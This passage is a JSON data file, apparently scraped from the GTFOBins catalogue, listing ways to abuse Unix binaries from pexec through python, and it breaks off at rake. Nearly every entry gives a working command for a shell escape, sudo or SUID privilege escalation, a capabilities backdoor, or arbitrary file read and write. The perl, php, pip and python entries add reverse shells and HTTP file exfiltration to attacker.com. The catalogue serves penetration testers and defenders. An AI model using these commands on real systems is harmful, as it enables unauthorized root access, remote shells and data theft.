                        "code": "sudo pg /etc/profile\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "pexec",
        "url": "https://gtfobins.github.io/gtfobins/pexec/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "pexec /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which pexec) .\n\n./pexec /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo pexec /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "perlbug",
        "url": "https://gtfobins.github.io/gtfobins/perlbug/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"
                    }
                ]
            }
        ]
    },
    {
        "name": "perl",
        "url": "https://gtfobins.github.io/gtfobins/perl/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "perl -e 'exec \"/bin/sh\";'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nperl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nperl -ne print $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which perl) .\n\n./perl -e 'exec \"/bin/sh\";'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo perl -e 'exec \"/bin/sh\";'"
                    }
                ]
            },
            {
                "function": "Capabilities",
                "description": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",
                "examples": [
                    {
                        "description": "",
                        "code": "cp $(which perl) .\nsudo setcap cap_setuid+ep perl\n\n./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
                    }
                ]
            }
        ]
    },
    {
        "name": "php",
        "url": "https://gtfobins.github.io/gtfobins/php/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "export CMD=\"/bin/sh\"\nphp -r 'system(getenv(\"CMD\"));'"
                    },
                    {
                        "description": "",
                        "code": "export CMD=\"/bin/sh\"\nphp -r 'passthru(getenv(\"CMD\"));'"
                    },
                    {
                        "description": "",
                        "code": "export CMD=\"/bin/sh\"\nphp -r 'print(shell_exec(getenv(\"CMD\")));'"
                    },
                    {
                        "description": "",
                        "code": "export CMD=\"/bin/sh\"\nphp -r '$r=array(); exec(getenv(\"CMD\"), $r); print(join(\"\\\\n\",$r));'"
                    },
                    {
                        "description": "",
                        "code": "export CMD=\"/bin/sh\"\nphp -r '$h=@popen(getenv(\"CMD\"),\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'"
                    }
                ]
            },
            {
                "function": "Command",
                "description": "It can be used to break out from restricted environments by running non-interactive system commands.",
                "examples": [
                    {
                        "description": "",
                        "code": "export CMD=\"id\"\nphp -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(getenv(\"CMD\"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nphp -r '$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.",
                        "code": "LHOST=0.0.0.0\nLPORT=8888\nphp -S $LHOST:$LPORT"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nphp -r '$c=file_get_contents(getenv(\"URL\"));file_put_contents(getenv(\"LFILE\"), $c);'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "write data to a file, filename should be absolute.",
                        "code": "export LFILE=file_to_write\nphp -r 'file_put_contents(getenv(\"LFILE\"), \"DATA\");'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_read\nphp -r 'readfile(getenv(\"LFILE\"));'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which php) .\n\nCMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\""
                    }
                ]
            },
            {
                "function": "Capabilities",
                "description": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",
                "examples": [
                    {
                        "description": "",
                        "code": "cp $(which php) .\nsudo setcap cap_setuid+ep php\n\nCMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\""
                    }
                ]
            }
        ]
    },
    {
        "name": "pic",
        "url": "https://gtfobins.github.io/gtfobins/pic/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "pic -U\n.PS\nsh X sh X"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The output is prefixed with a some content as a header.",
                        "code": "LFILE=file_to_read\npic $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo pic -U\n.PS\nsh X sh X"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which pic) .\n\n./pic -U\n.PS\nsh X sh X"
                    }
                ]
            }
        ]
    },
    {
        "name": "pico",
        "url": "https://gtfobins.github.io/gtfobins/pico/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "pico\n^R^X\nreset; sh 1>&0 2>&0"
                    },
                    {
                        "description": "The SPELL environment variable can be used in place of the -s option if the command line cannot be changed.",
                        "code": "pico -s /bin/sh\n/bin/sh\n^T"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "pico file_to_write\nDATA\n^O"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "pico file_to_read"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo pico\n^R^X\nreset; sh 1>&0 2>&0"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "The SPELL environment variable can be used in place of the -s option if the command line cannot be changed.",
                        "code": "sudo install -m =xs $(which pico) .\n\n./pico -s /bin/sh\n/bin/sh\n^T"
                    }
                ]
            }
        ]
    },
    {
        "name": "pidstat",
        "url": "https://gtfobins.github.io/gtfobins/pidstat/",
        "functions": [
            {
                "function": "Command",
                "description": "It can be used to break out from restricted environments by running non-interactive system commands.",
                "examples": [
                    {
                        "description": "",
                        "code": "COMMAND=id\npidstat -e $COMMAND"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which pidstat) .\n\nCOMMAND=id\n./pidstat -e $COMMAND"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "COMMAND=id\nsudo pidstat -e $COMMAND"
                    }
                ]
            }
        ]
    },
    {
        "name": "pip",
        "url": "https://gtfobins.github.io/gtfobins/pip/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\npip install $TF"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\npip install $TF"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\npip install $TF"
                    },
                    {
                        "description": "Serve files in the local folder running an HTTP server.",
                        "code": "export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\npip install $TF"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request. It needs an absolute local file path.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' > $TF/setup.py\npip install $TF"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "It needs an absolute local file path.",
                        "code": "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"open('$LFILE','w+').write('DATA')\" > $TF/setup.py\npip install $TF"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The read file content is corrupted as wrapped within an exception error.",
                        "code": "TF=$(mktemp -d)\necho 'raise Exception(open(\"file_to_read\").read())' > $TF/setup.py\npip install $TF"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\npip install $TF"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF"
                    }
                ]
            }
        ]
    },
    {
        "name": "pkexec",
        "url": "https://gtfobins.github.io/gtfobins/pkexec/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo pkexec /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "pkg",
        "url": "https://gtfobins.github.io/gtfobins/pkg/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "sub_description": "It runs commands using a specially crafted FreeBSD package. Generate it with fpm and upload it to the target.",
                        "code": "TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF"
                    },
                    {
                        "code": "sudo pkg install -y --no-repo-update ./x-1.0.txz"
                    }
                ]
            }
        ]
    },
    {
        "name": "posh",
        "url": "https://gtfobins.github.io/gtfobins/posh/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "posh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo posh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which posh) .\n\n./posh"
                    }
                ]
            }
        ]
    },
    {
        "name": "pr",
        "url": "https://gtfobins.github.io/gtfobins/pr/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\npr -T $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which pr) .\n\nLFILE=file_to_read\npr -T $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\npr -T $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "pry",
        "url": "https://gtfobins.github.io/gtfobins/pry/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "pry\nsystem(\"/bin/sh\")"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo pry\nsystem(\"/bin/sh\")"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which pry) .\n\n./pry\nsystem(\"/bin/sh\")"
                    }
                ]
            }
        ]
    },
    {
        "name": "psftp",
        "url": "https://gtfobins.github.io/gtfobins/psftp/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "psftp\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo psftp\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which psftp) .\n\nsudo psftp\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "psql",
        "url": "https://gtfobins.github.io/gtfobins/psql/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "psql\n\\?\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "psql\n\\?\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "ptx",
        "url": "https://gtfobins.github.io/gtfobins/ptx/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nptx -w 5000 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ptx) .\n\nLFILE=file_to_read\n./ptx -w 5000 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo ptx -w 5000 \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "puppet",
        "url": "https://gtfobins.github.io/gtfobins/puppet/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\""
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file path must be absolute.",
                        "code": "LFILE=\"/tmp/file_to_write\"\npuppet apply -e \"file { '$LFILE': content => 'DATA' }\""
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The read file content is corrupted by the diff output format. The actual /usr/bin/diff command is executed.",
                        "code": "LFILE=file_to_read\npuppet filebucket -l diff /dev/null $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\""
                    }
                ]
            }
        ]
    },
    {
        "name": "pwsh",
        "url": "https://gtfobins.github.io/gtfobins/pwsh/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "pwsh"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_write\npwsh -c '\"DATA\" | Out-File $env:LFILE'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo pwsh"
                    }
                ]
            }
        ]
    },
    {
        "name": "python",
        "url": "https://gtfobins.github.io/gtfobins/python/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "python -c 'import os; os.system(\"/bin/sh\")'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'"
                    },
                    {
                        "description": "Serve files in the local folder running an HTTP server.",
                        "code": "export LPORT=8888\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "python -c 'open(\"file_to_write\",\"w+\").write(\"DATA\")'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "python -c 'print(open(\"file_to_read\").read())'"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "",
                        "code": "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which python) .\n\n./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo python -c 'import os; os.system(\"/bin/sh\")'"
                    }
                ]
            },
            {
                "function": "Capabilities",
                "description": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",
                "examples": [
                    {
                        "description": "",
                        "code": "cp $(which python) .\nsudo setcap cap_setuid+ep python\n\n./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
                    }
                ]
            }
        ]
    },
    {
        "name": "rake",
        "url": "https://gtfobins.github.io/gtfobins/rake/",
        "functions": [
            {
                "function": "Shell",
